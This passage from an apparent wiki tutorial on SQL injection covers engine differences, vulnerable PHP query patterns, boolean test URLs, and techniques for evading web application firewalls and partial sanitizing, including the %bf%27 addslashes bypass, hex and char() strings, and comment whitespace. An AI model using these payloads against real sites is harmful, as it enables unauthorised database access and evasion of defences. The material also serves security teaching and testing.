</td></tr></table>
<p><br />
</p><p><br />
</p>
<h3> <span class="mw-headline" id="Legacy_databases">Legacy databases</span></h3>
<p>The information_schema database entered the open source community in MySQL version 5 and at the end of PostgreSQL Version 7.3; old and current versions of <a href="/SQL" title="SQL">SQL</a> engines contain their schema information in their administration databases.  More information can be found on this by combining techniques listed here with the manuals and documentation.
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<p><b>Access/MSSQL</b>
</p>
<ul><li> sysobjects  table/database  (Legacy Access/Jet Engine)
</li><li> msysobjects table/database  (Legacy SQL Server CE)
</li></ul>
</td></tr></table>
<dl><dd><i><b>PROCEDURE ANALYSE</b> might come in handy.</i>
</dd></dl>
<table class="wikitable" width="100%">
<tr>
<td>
<p><b>MySQL 4</b>
</p>
<ul><li> MySQL.columns_priv
</li><li> MySQL.tables_priv
</li><li> MySQL.db
</li></ul>
</td></tr></table>
<dl><dd><i>It is typical that legacy database versions require privileged access for flexible mapping.</i>
</dd></dl>
<h2> <span class="mw-headline" id="Databasing_engines_compared_and_contrasted_in_light_of_SQL_injection"> Databasing engines compared and contrasted in light of SQL injection </span></h2>
<p>For compatibility purposes it is important to be mindful of what functions, environment variables, and tables are ubiquitous.  When writing an automated attack tool, it is convenient to be able to use the same function in each SQL dialect, rather than choosing a function or variable per sql version.
</p>
<ul><li> Additional similarities are added each update to the various database engines.  Read the manuals for the affected engines to get an up-to-date view.
</li><li> Not all similarities or differences are documented here, only those relevant to SQL injection.
</li><li> Similarities and differences between database engines include table and column names, function names, environment variables, and statement syntax.
</li></ul>
<p>There are enough similarities that it is possible to have a degree of <b>universal exploitation</b>.
</p>
<h3> <span class="mw-headline" id="Information_schema">Information_schema</span></h3>
<p>All of the databasing engines that presently have an <b>information_schema</b> collection have the following in common:
</p>
<ul><li> The <b>information_schema.tables</b> table has a <b>table_name column</b>.
</li><li> The <b>information_schema.columns</b> table has both <b>table_name</b> and <b>column_name</b> columns.
</li><li> All of them have <b>information_schema.routines</b> and <b>information_schema.schemata</b> tables.
</li></ul>
<p>These database engines include <a href="/index.php?title=PostgreSQL&amp;action=edit&amp;redlink=1" class="new" title="PostgreSQL (page does not exist)">PostgreSQL</a>, <a href="/MySQL" title="MySQL">MySQL</a>, and <a href="/MSSQL" title="MSSQL">MSSQL</a>.
</p>
<h3> <span class="mw-headline" id="Functions_.26_environment_variables">Functions &amp; environment variables</span></h3>
<p>Similarities between the different engines
</p><p><b>MS SQL</b>, <b>MySQL</b>, and <b>PostgreSQL</b> share the following:
</p>
<ul><li> ascii()
</li><li> substring()
</li><li> count()
</li><li> lower()
</li><li> upper()
</li><li> <b>BETWEEN ... AND ...</b> conditional operator
</li></ul>
<p><b>MySQL</b> and <b>Postgres</b> share the following:
</p>
<ul><li> current_database()
</li><li> version()
</li><li> current_user 
</li><li> LIMIT ... OFFSET ... clause syntax
</li></ul>
<p><b>MySQL</b> and <b>MSSQL</b> share the following: 
</p>
<ul><li> database()
</li><li> @@version
</li><li> RLIKE clause for regular expressions
</li></ul>
<h3> <span class="mw-headline" id="Other_syntax">Other syntax</span></h3>
<p>All of the databases share the same comparison operators, basic <b>SELECT</b>, <b>WHERE</b>, <b>GROUP</b>, and <b>ORDER</b> syntax. PostgreSQL and MySQL now also share the same <b>LIMIT syntax</b>}}
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">LIMIT</span> <span class="br0">&#91;</span><span class="kw1">COUNT</span><span class="br0">&#93;</span> offset <span class="br0">&#91;</span><span class="kw1">ROW</span> <span class="kw1">TO</span> <span class="kw1">START</span> at<span class="br0">&#93;</span></pre></div></div>
</td></tr></table>
<p><b>Microsoft SQL</b> does not have a LIMIT clause.  In stead, sub-queries with <b>SELECT TOP</b> and <b>ORDER BY</b> clauses are used as a workaround.  This makes for a less readable query and a more frustrating attack.
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">SELECT</span> top <span class="nu0">1</span> $column <span class="kw1">FROM</span> <span class="br0">&#40;</span><span class="kw1">SELECT</span> top $OFFSET $column <span class="kw1">FROM</span> $table <span class="br0">&#91;</span><span class="kw1">WHERE</span> clause<span class="br0">&#93;</span> <span class="br0">&#91;</span><span class="kw1">GROUP</span> <span class="kw1">BY</span> clause<span class="br0">&#93;</span> <span class="kw1">ORDER</span> <span class="kw1">BY</span> $column <span class="kw1">DESC</span><span class="br0">&#41;</span> sq <span class="br0">&#91;</span><span class="kw1">GROUP</span> <span class="kw1">BY</span> clause<span class="br0">&#93;</span> <span class="kw1">ORDER</span> <span class="kw1">BY</span> $column <span class="kw1">ASC</span></pre></div></div>
</td></tr></table>
<h3> <span class="mw-headline" id="Capabilities">Capabilities</span></h3>
<p>Different <a href="/SQL" title="SQL">SQL</a> <a href="/Databasing_engine" title="Databasing engine">databasing engines</a> have different capabilities.  As a result, there are advantages and disadvantages passed to an attacker for each limitation or unique piece of functionality that a SQL server may have to offer.
</p>
<ul><li> MSSQL Has the ability to execute server side commands natively via <b>xp_cmdshell</b>.  This feature can be enabled or disabled (remotely), and other functions exist to read/write to the windows registry.
</li><li> MySQL has the ability to read and write to files using the <b>LOAD DATA</b> and <b>SELECT ... INTO OUTFILE ...</b> statements as well as the <b>load_file()</b> function.
</li><li> PostgreSQL is the only databasing engine which supports trigger functions or other user-defined functionality added to a table in most procedural scripting languages (<a href="/Perl" title="Perl">Perl</a>,<a href="/Python" title="Python">Python</a>,<a href="/Ruby" title="Ruby">Ruby</a>).  Because it supports stacked queries when combined with <a href="/PHP" title="PHP">PHP</a>, it is possible to use <strong class="selflink">SQL injection</strong> to install an <a href="/SQL_backdoor" title="SQL backdoor">SQL backdoor</a> or plugin.
</li></ul>
<p><br />
</p><p><br />
</p>
<h1> <span class="mw-headline" id="Modern_day_SQL_injection_obstacles_and_countermeasures"> Modern day SQL injection obstacles and countermeasures </span></h1>
<p>Obstacles can occur on various layers of the OSI model.  The software layer may filter the <a href="/Input" title="Input">input</a> during its processing.  The <a href="/Networking_Concepts" title="Networking Concepts">network layer</a> may be monitored by a <a href="/NIDS" title="NIDS">NIDS</a> or <a href="/IPS" title="IPS">IPS</a> and begin to drop traffic, add captcha verifications, or redirect to a honeypot.  The HTTP <a href="/Server" title="Server">server</a> may also be running a Web Application Firewall. A researcher or penetration tester may find <i>overcoming</i> these obstacles difficult, but usually <a href="#Bypassing_Modern_SQL_Injection_Security_Measures">not impossible given enough dedication.</a>
</p>
<h2> <span class="mw-headline" id="Configuration_.26_environment_challenges"> Configuration &amp; environment challenges </span></h2>
<p>Due to certain <a href="/Vulnerability" title="Vulnerability">vulnerabilities</a> requiring the use of <a href="/Boolean_enumeration" title="Boolean enumeration">boolean enumeration</a> or timing attacks, many <a href="/HTTP" title="HTTP">HTTP</a> requests may be needed in order to successfully determine <a href="/Database" title="Database">database</a> contents, making the process of arbitrarily accessing data quite time consuming and noisy. Different <a href="/Databasing_engine" title="Databasing engine">databasing engines</a> have different configuration settings, but usually include some form of maximum number of connections, maximum query size, maximum results size, maximum number of connections per user or client, and other resource restrictive options. Simply distributing a time consuming attack may only hinder the attacker by exhausting resources.
</p><p>Database permissions and role-based-access control integration for the <a href="/Web_applications" title="Web applications" class="mw-redirect">application</a> may also play a large role in the amount of data an attacker may gather, as SQL injection only exploits in the context of the active connection to the SQL server that the <a href="/Vulnerability" title="Vulnerability">vulnerable query</a> executes within (ie. the username and password that the application is using for the query being exploited). <a href="/Programming_language" title="Programming language" class="mw-redirect">Programming languages</a> have different configurations for runtime as well, such as memory limits and maximum execution time when configured to run in conjunction with a webserver. Older versions of database servers may not have an information_schema database and may require a privileged user (like the database server administrator) to access any schema information.
</p>
<h3> <span class="mw-headline" id="IDS.2C_IPS.2C_and_web_application_firewalls"> <a href="/IDS" title="IDS">IDS</a>, <a href="/IPS" title="IPS">IPS</a>, and <a href="/Web_applications" title="Web applications" class="mw-redirect">web application</a> <a href="/Firewall" title="Firewall">firewalls</a> </span></h3>
<p>Web application firewalls usually operate at the same layer as the <a href="/HTTP" title="HTTP">HTTP</a> server or <a href="/Web_application" title="Web application">web applications</a>, and thus monitor the <a href="/Protocol" title="Protocol">protocol</a> and <a href="/Input" title="Input">input</a> layers.  This is different than normal <a href="/IDS" title="IDS">IDS</a>, which are stand-alone pieces of software or hardware that inspect the network and the host layer. Most intrusion detection mechanisms built for <a href="/Web_applications" title="Web applications" class="mw-redirect">web applications</a> operate using <b>signature-based</b> detection.  Therefore, as long as an attack does not match a signature, it will slip by most of them.
</p>
<h3> <span class="mw-headline" id="Common_web_application_firewall_HTTPD_modules"> Common web application firewall HTTPD modules </span></h3>
<ul><li> <i>Mod_Security</i> (<b>Apache</b>)
</li><li> <i>Naxsi</i> (<b><a href="/NGINX" title="NGINX">Nginx</a></b>)
</li><li> <i>ISAPI</i> Filters (<b>Microsoft IIS</b>)
</li></ul>
<p>Common signatures use <b>regular expressions</b> that will match (and block) many common or simple testing techniques.
</p>
<h2> <span class="mw-headline" id="Improper_sanitizing"> Improper sanitizing </span></h2>
<p>Any time improper <a href="/Sanitize" title="Sanitize">sanitizing</a> takes place there is a potential for partial sanitizing, and may make the <a href="/Web_Exploitation" title="Web Exploitation" class="mw-redirect">exploitation</a> process highly difficult if not impossible.
</p>
<h3> <span class="mw-headline" id="Partial_sanitizing"> Partial sanitizing </span></h3>
<p>Partial sanitizing may affect any or more (unlisted here) of the following important syntax characters and result in them being encoded in some fashion, escaped, or removed entirely.  In many circumstances, it is possible to craft injection queries without syntax characters, resulting in <a href="/Filter_bypass" title="Filter bypass">filter bypass</a> and sometimes <a href="/IDS_evasion" title="IDS evasion">IDS evasion</a>.
</p>
<ul><li> The <b>space</b> character (or all <b>whitespace</b>) 
</li></ul>
<dl><dd><font size="-1">Jump to <a href="/Sql_injection_without_whitespace" title="Sql injection without whitespace" class="mw-redirect">sql injection without whitespace</a></font>
</dd></dl>
<ul><li> The <b>single quote</b> and <b>double quote</b> characters: <b>&#x27;</b>, <b>&#x22;</b>
</li></ul>
<dl><dd><font size="-1">Jump to <a href="/Sql_injection_without_quotes" title="Sql injection without quotes" class="mw-redirect">sql injection without quotes</a></font>
</dd></dl>
<ul><li> The <b>tag</b> or "equals" comparative operators: <b>&lt;</b>, <b>&gt;</b>, and <b>=</b>
</li></ul>
<dl><dd><font size="-1">Jump to <a href="/Sql_injection_without_tags" title="Sql injection without tags" class="mw-redirect">sql injection without tags</a></font>
</dd></dl>
<ul><li> The <b>comma</b> character: <b>,</b>
</li></ul>
<dl><dd><font size="-1">Jump to <a href="/Sql_injection_without_commas" title="Sql injection without commas" class="mw-redirect">sql injection without commas</a></font>
</dd></dl>
<ul><li> The <b>parenthesis</b> characters: <b>(</b> and <b>)</b>
</li></ul>
<h3> <span class="mw-headline" id="Deprecated_sanitizing">Deprecated sanitizing</span></h3>
<p><a href="/PHP" title="PHP">PHP</a>'s <b>addslashes()</b> function (now deprecated) relied on the <b>unhex()</b> function.  The goal of addslashes() was to add an escape (\) behind any single quotes (') entered into a string.  When multi-byte character sets (or collations) are in use, this can cause a <a href="/Vulnerability" title="Vulnerability">vulnerability</a> to occur.  If a valid multi-<a href="/Byte" title="Byte">byte</a> character ends in 0x5c (the escape), it is possible to circumvent the escape completely by placing the first byte of that character before the single quote.  When unhex() is called against the now escaped single-quote, it sees the two bytes as a single character, allowing the quote (0x27) to escape the string unscathed.  An example prefix for a non-utf8 character set's multi-byte prefix that accepts 0x5c as an ending is 0xbf, so one could use <b>%bf%27</b> in a url to <b>bypass the use of addslashes()</b>.
</p>
<h1> <span class="mw-headline" id="Basic_remote_tests_for_SQL_injection_vulnerabilities"> Basic remote tests for SQL injection vulnerabilities </span></h1>
<p>There are a number of factors to take into consideration when analyzing a <a href="/SQL" title="SQL">SQL</a> injection <a href="/Vulnerability" title="Vulnerability">vulnerability</a>.  These factors will determine methodology for successful exploitation. SQL injection vulnerabilities are typically either standard injection vulnerabilities, <b>error-based</b> vulnerabilities, or <b>blind</b> vulnerabilities, blind being the most difficult of the three.
</p>
<ul><li> <b>Standard vulnerabilities</b> - The page can be exploited by using the <a href="#Basic_Injection_:_Union_Select"><b>UNION SELECT</b> or <b>UNION ALL SELECT</b> statements</a> to simply display selected data on the page.
</li><li> <b>Error-based vulnerabilities</b> - Error based vulnerabilities occur when verbose errors from the <a href="/SQL" title="SQL">SQL</a> <a href="/Databasing_engine" title="Databasing engine">databasing engine</a> are enabled and displayed on the page.  Thus, attackers may use things such as illegal type conversions to throw errors containing data.
</li><li> <b>Blind vulnerabilities</b> - Blind <a href="/SQL" title="SQL">SQL</a> injection vulnerabilities are not only the most difficult to exploit, but also the most time consuming.  <a href="#Expert:_Timing_attacks_for_automated_boolean_enumeration">Timing attacks</a> and <a href="#Advanced:_Manual_Boolean_Enumeration">boolean enumeration</a> are the only methods of successful exploitation of select statements.
</li></ul>
<p><br />
</p>
<h2> <span class="mw-headline" id="Injection_points">Injection points</span></h2>
<p>An <a href="/SQL" title="SQL">SQL</a> injection <a href="/Vulnerability" title="Vulnerability">vulnerability</a>'s type is determined by the location of the user input.  <b>$input</b> is used as an example input variable in the queries below to illustrate their classifications.
</p>
<ul><li> <b>SELECT</b> ... <b>WHERE</b> clause injection
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1"><span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from table where id=<span class="es4">$input</span>&quot;</span><span class="sy0">;</span></pre></div></div>
</td></tr></table>
<ul><li> <b>SELECT</b> ... <b>LIMIT</b>, <b>OFFSET</b>, <b>ORDER BY</b>, and <b>GROUP BY</b> clause injections
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1"><span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from table limit <span class="es4">$input</span>&quot;</span><span class="sy0">;</span>
<span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from table limit 1 offset <span class="es4">$input</span>&quot;</span><span class="sy0">;</span>
<span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from table order by <span class="es4">$input</span>&quot;</span><span class="sy0">;</span>
<span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from table group by <span class="es4">$input</span>&quot;</span><span class="sy0">;</span></pre></div></div>
</td></tr></table>
<ul><li> <b>UPDATE</b> ... <b>SET</b> clause injection
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1"><span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;update table set var=<span class="es4">$input</span>&quot;</span><span class="sy0">;</span></pre></div></div>
</td></tr></table>
<ul><li> <b>UPDATE</b> ... <b>WHERE</b> clause injection
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1"><span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;update table set var=value where column_name='<span class="es4">$input</span>'&quot;</span><span class="sy0">;</span></pre></div></div>
</td></tr></table>
<ul><li> <b>INSERT</b> ... <b>VALUES</b> clause injection
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1"><span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;insert into table values(null,<span class="es4">$input</span>)&quot;</span><span class="sy0">;</span></pre></div></div>
</td></tr></table>
<h2> <span class="mw-headline" id="Input_testing">Input testing</span></h2>
<p><a href="/Vulnerability" title="Vulnerability">Vulnerabilities</a> always stem from user input.  In <a href="/Web_applications" title="Web applications" class="mw-redirect">web applications</a>, <a href="/User" title="User">user</a> input may come from a variety of places: forms, <a href="/Cookies" title="Cookies">cookies</a>, GET parameters, and other request headers. In order to test for vulnerabilities remotely, researchers test the urls, forms, and cookies associated with the site or software of interest.}}
</p>
<h3> <span class="mw-headline" id="Your_first_where_clause_injection">Your first where clause injection</span></h3>
<p>The most reliable of tests consist of boolean challenges that filter the results a query returns combined with arithmetic operators.
<i>Boolean challenges will return zero rows if conditions are not met, whereas they will return the same value if the conditions are met.  This way researchers are able to determine vulnerability via a <b>"true/false" test.</b></i>
</p>
<ul><li> In the first example (using <b>$id</b>) we have an <b>unsanitized integer</b>.  The <b>URI</b> (uniform resource indicator) may look something like: 
</li></ul>
<pre> <i>/article_by_id.php?id&#x3d;10</i>
</pre>
<ul><li> A researcher could check that <b>URI</b> against:
</li></ul>
<pre> <i>/article_by_id.php?id&#x3d;10%20AND%201&#x3d;1</i>
 <b>and</b>
 <i>/article_by_id.php?id&#x3d;10%20AND%201&#x3d;0</i>
</pre>
<ul><li> <b>When a page is vulnerable, the page on</b>
</li></ul>
<pre> <i>/article_by_id.php?id&#x3d;10%20AND%201&#x3d;1</i>
</pre>
<p><b>will match the page on:</b>
</p>
<pre> <i>/article_by_id.php?id&#x3d;10</i>
</pre>
<p><b>however the page at:</b>
</p>
<pre> <i>/article_by_id.php?id&#x3d;10%20AND%201&#x3d;0</i>
</pre>
<p><b>will have data (and likely the entire article) missing.</b>
</p>
<ul><li> In the second example, using <b>$title</b>, the same affect can be achieved on an <b>unsanitized string</b> with the following <b>URI'</b>s:
</li></ul>
<pre> <i>/article_by_title.php?id&#x3d;SQL%27%20AND%20%271%27&#x3d;%270</i>
 <i>/article_by_title.php?id&#x3d;SQL%27%20AND%20%271%27&#x3d;%271</i>
</pre>
<p><i>The same methodology as the integer test applies, merely with added single quotes (<b>%27</b>)</i>.
</p>
<table style="background: #FFC1C1; border: 2px solid #FF7070; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/RPU0j.png" alt="RPU0j.png" />
</td>
<td><center>Most of <a href="#Modern_day_SQL_Injection_Obstacles_and_Countermeasures">today's security systems</a> will easily identify and block simple testing methods like those illustrated above.</center>
</td></tr></table>
<h3> <span class="mw-headline" id="Reconstructing_injected_queries"> Reconstructing injected queries </span></h3>
<p>Reconstruction of queries locally will be available if the <a href="/SQL" title="SQL">SQL</a> database engines is installed.  Links are provided at the end of the page for following along.
<i><b> Using the above testing examples, the queries generated from the url tampering will be reconstructed.</b></i>
</p>
<ul><li> <b>Original Query:</b>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1"><span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from articles where id=<span class="es4">$id</span>&quot;</span><span class="sy0">;</span></pre></div></div>
</td></tr></table>
<ul><li> <b>Generated Queries:</b>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1"><span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from articles where id=10 and 1=1&quot;</span><span class="sy0">;</span>
<span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from articles where id=10 and 1=0&quot;</span><span class="sy0">;</span></pre></div></div>
</td></tr></table>
<p>Or, alternatively, the $title example can be examined:
</p>
<ul><li> <b>Original query:</b>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1"><span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from articles where title='<span class="es4">$title</span>'&quot;</span><span class="sy0">;</span></pre></div></div>
</td></tr></table>
<ul><li> <b>Generated queries:</b>
</li></ul>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="php source-php"><pre class="de1"><span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from articles where title='SQL' and '1'='0'&quot;</span><span class="sy0">;</span>
<span class="re0">$query</span> <span class="sy0">=</span> <span class="st0">&quot;select * from articles where title='SQL' and '1'='1'&quot;</span><span class="sy0">;</span></pre></div></div>
</td></tr></table>
<ul><li> <i>The values of <b>$id</b> and <b>$title</b> are being passed directly into the SQL query.  Because 1 will always equal 1, the results are passed directly back.  When the false test (1&#x3d;0) is applied, no data is returned by the query because there is no row in the database where 1&#x3d;0.  1 always equals 1.</i>
</li></ul>
<h1> <span class="mw-headline" id="Bypassing_modern_SQL_injection_security_measures">Bypassing modern SQL injection security measures</span></h1>
<table style="background: #F8F8FF; border: 2px solid #8888AA; width: 90%; margin: 5px auto; border-radius: 10px; -moz-border-radius: 10px; -webkit-border-radius: 10px; -khtml-border-radius: 10px; -icab-border-radius: 10px; -o-border-radius: 10px;">
<tr>
<td width="1%" style="padding-right:1em;"><img src="http://i.imgur.com/c3el4.png" alt="c3el4.png" />
</td>
<td><i>Simply triggering an <a href="/IPS" title="IPS">IPS</a> or <b>WAF</b> and having the request blocked under only certain conditions <b>does not confirm the vulnerability of the page.</i></b>
</td></tr></table>
<p>To exploit or even test <a href="/Web_applications" title="Web applications" class="mw-redirect">web applications</a> in the modern world, <a href="/IDS" title="IDS">countermeasures</a> that are in place would need to be recognized and defeated.
A <b>WAF</b> is probably in the way if the following things are being experienced:
</p>
<ul><li> Having the connection to the server reset <b>ONLY</b> when testing the site for vulnerabilities
</li><li> 403 Forbidden responses <b>ONLY</b> when testing the site for vulnerabilities
</li><li> Being blocked by the remote firewall after a <b>repeatable number</b> of injection attempts
</li></ul>
<p>Many <a href="/IDS" title="IDS">IDS</a> and <u>WAF</u> systems can be easily evaded by either:
</p>
<ul><li> <i>Simply using <b>SSL</b> or <b>HTTPS</b></i>
</li><li> <i>Using a de-syncronization attack like <b>session-splicing</b> when <b>SSL</b> is not an option.</i>
</li></ul>
<h2> <span class="mw-headline" id="Basic_signature_evasion">Basic signature evasion</span></h2>
<p>Signature evasion is very similar to <a href="#Defeating_partial_sanitizing">evading partial sanitizing</a>.  Instead of modifying the characters, an <a href="/IPS" title="IPS">IPS</a> drops traffic if the characters appear in a particular sequence in order to match a pattern.  By discovering that sequence, adjustments can be made to the queries to <a href="/IDS_Evasion" title="IDS Evasion" class="mw-redirect">evade</a> the <a href="/IPS" title="IPS">IPS</a> or <b>WAF</b> in the way of the testing.
Many web application firewalls will recognize the "1=1" test simply due to its popularity.  Other queries that are very similar may also be noticed.  Lets suppose the signature is looking for something along the lines of [integer][equal sign][integer], or that a request with "AND 1=1" had its connection reset, but the page without the injection continues to load.
</p>
<h3> <span class="mw-headline" id="Whitespace_placement">Whitespace placement</span></h3>
<p>Take note of the whitespace around the <b>=</b> operator.  If there is none, try adding a space.  If there is a space on each side, try removing or adding one to see if there isn't a proper length delimiter on the signature. Lopsided, missing, or extra whitespace may be found that can bypass signature-based analysis engines.
</p>
<pre>&#160;%20and%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%201=%20%20%20%201 (<b>TRUE</b>)
&#160;%20and%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%201=%20%20%20%200 (<b>FALSE</b>)
</pre>
<h3> <span class="mw-headline" id="Integer_and_string_size_delimiters">Integer and string size delimiters</span></h3>
<p>Because there is usually a size delimiter or a maximum size to the integer, the size to stop detection can be exceeded.  Ten digit random numbers, instead of the single digit predictable numbers might do the trick.
</p>
<pre>&#160;%20and%402837649781237849=402837649781237849 (<b>TRUE</b>)
&#160;%20and%201789236419872364=128756128398671289 (<b>FALSE</b>)
</pre>
<h3> <span class="mw-headline" id="Switching_up_the_data_types">Switching up the data types</span></h3>
<p>If integers are proving a hard time, the signature may be tuned too specifically to integers.  Try mixing the comparisons up a bit, using strings or floating point values to de-rail the signature.
</p>
<pre>&#160;%20and%205.8=5.8      (<b>TRUE</b>)
&#160;%20and%200.2=0.3      (<b>FALSE</b>)
</pre>
<h3> <span class="mw-headline" id="Arithmetic_tests">Arithmetic tests</span></h3>
<p>Instead of comparing a value like "1=1", compare mathematical expressions.  Mathematical expressions may be the key to bypassing the problem if there are still problems with signature detection.
</p>
<pre>&#160;%20and%201.2+3=4.2    (<b>TRUE</b>)
&#160;%20and%200.2-1=0      (<b>FALSE</b>)
</pre>
<h3> <span class="mw-headline" id="Capitalization">Capitalization</span></h3>
<p>If there are still problems <i>during testing</i>, this probably isn't the issue.  Try changing the case of the letters making up the boolean operator (<b>and</b> to <b>AnD</b> and <b>or</b> to <b>oR</b>).
</p>
<h3> <span class="mw-headline" id="Extending_conditional_statements">Extending conditional statements</span></h3>
<p>Many <a href="/IDS" title="IDS">IDS</a> signatures will look for a boolean operator ("<b>and</b>" or "<b>or</b>") before a conditional statement if it is being appended to another conditional statement (e.g. after query reconstruction we have where id&#x3d;1 and 1&#x3d;1, there are two conditions there).
</p>
<ul><li> Using <b>IF</b> for MySQL injection:
</li></ul>
<p>The syntax for the <b>IF</b> statement in MySQL is:
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">IF</span><span class="br0">&#40;</span><span class="br0">&#91;</span>condition<span class="br0">&#93;</span><span class="sy0">,</span><span class="br0">&#91;</span><span class="kw1">VALUE</span> <span class="kw1">TO</span> <span class="kw1">RETURN</span> <span class="kw1">IF</span> <span class="kw1">TRUE</span><span class="br0">&#93;</span><span class="sy0">,</span><span class="br0">&#91;</span><span class="kw1">ELSE</span> <span class="kw1">RETURN</span> <span class="kw1">VALUE</span><span class="br0">&#93;</span><span class="br0">&#41;</span></pre></div></div>
</td></tr></table>
<pre>&#160;%20and%20if(10829361=10829361,1,0)  (<b>TRUE</b>)
&#160;%20and%20if(98276232=72619126,1,0)  (<b>FALSE</b>)
</pre>
<p>Any combination of the above techniques can be used in conjunction with one another as long as the queries still return true and false.
</p>
<h2> <span class="mw-headline" id="Defeating_partial_sanitizing">Defeating partial sanitizing</span></h2>
<p>If an attempt is made to bypass the sanitizing by breaking the <a href="#Patching_SQL_Injection_Vulnerabilities">sanitizing method</a>, there will most likely be trouble. Instead,  bypass the sanitizing by crafting queries that do not require <a href="/Sanitize" title="Sanitize">sanitized characters</a>.
</p>
<h3> <span class="mw-headline" id="Quotes">Quotes</span></h3>
<p>MySQL and certain versions of Microsoft SQL allow for string literals to be passed in <a href="/Assembly_Basics#Binary_.26_Hexadecimal" title="Assembly Basics" class="mw-redirect">hexadecimal</a> format.:
</p>
<pre> <b>select 'abc';</b>
 <i>...is equivalent to...</i>
 <b>select 0x616263;</b>.
 Additionally, <b>PostgreSQL</b> allows the use of two dollar signs as string delimiters
 <b>select $$abc$$;</b>
</pre>
<p><i>Therefore,  0x616263 can be used in place of 'abc'.  This will come in handy while exploiting a <u>WHERE</u> clause and not being able to use quotes.</i>}}
</p><p><b>String concatenation can avoid the use of quotes the use of quotes in:</b>
</p>
<ul><li> <i>MySQL:</i>
</li></ul>
<pre> <u>Using the <b>char()</b> function to construct the string '<b>abc'</b></u>:
 <b>select char(97,98,99);</b>
 <b>-&gt;</b><i>Similar to the hex example, <b>char(97,98,99)</b> can be used interchangeably with the string '<b>abc'</b>.</i>
</pre>
<ul><li> <i>PostgreSQL:</i>
</li></ul>
<pre> <u>Using the <b>chr()</b> function and <b>double-pipe concatenation</b> operator</u>:
 <b>select chr(97)&#x7c;&#x7c;chr(98)&#x7c;&#x7c;chr(99);</b>
 <b>-&gt;</b><i>Similar to the above example, <b>chr(97)&#x7c;&#x7c;chr(98)&#x7c;&#x7c;chr(99)</b> can be used interchangeably with the string '<b>abc'</b>.</i>
</pre>
<ul><li> <i>Microsoft SQL Server:</i>
</li></ul>
<pre> <u>Using the <b>char()</b> function and <b>plus</b> operator</u>:
 <b>select char(97)+char(98)+char(99);</b>
 <b>-&gt;</b><i>Similar to the other examples, <b>char(97)+char(98)+char(99)</b> can be used interchangeably with the string '<b>abc'</b>.</i>
</pre>
<h3> <span class="mw-headline" id="Whitespace_filtering"> Whitespace filtering </span></h3>
<p>Filtering can be bypassed on the space character by using alternative whitespace characters to the <b>space</b> character (%20).  Most <a href="/SQL" title="SQL">SQL</a> engines consider a line return (%0a in a *NIX environment,&#160;%0a%0d in a Windows environment), tab characters, or the <b>+</b> character as valid whitespace:
</p>
<pre> and%0a1&#x3d;1
 and%0a1&#x3d;0
 and+1&#x3d;1
 and+1&#x3d;0
</pre>
<p><i><a href="/MySQL" title="MySQL">MySQL</a> treats block comments as whitespace.</i>
</p>
<table class="wikitable" width="100%">
<tr>
<td>
<div dir="ltr" class="mw-geshi" style="text-align: left;"><div class="sql source-sql"><pre class="de1"><span class="kw1">AND</span><span class="coMULTI">/*comment1*/</span><span class="nu0">1</span><span class="coMULTI">/*comment2*/</span><span class="sy0">=</span><span class="coMULTI">/*comment3*/</span><span class="nu0">1</span>
<span class="kw1">AND</span><span class="coMULTI">/*comment1*/</span><span class="nu0">1</span><span class="coMULTI">/*comment2*/</span><span class="sy0">=</span><span class="coMULTI">/*comment3*/</span><span class="nu0">0</span></pre></div></div>
</td></tr></table>
<h2> <span class="mw-headline" id="Bypassing_XSS_filters_during_SQL_injection">Bypassing XSS filters during SQL injection</span></h2>
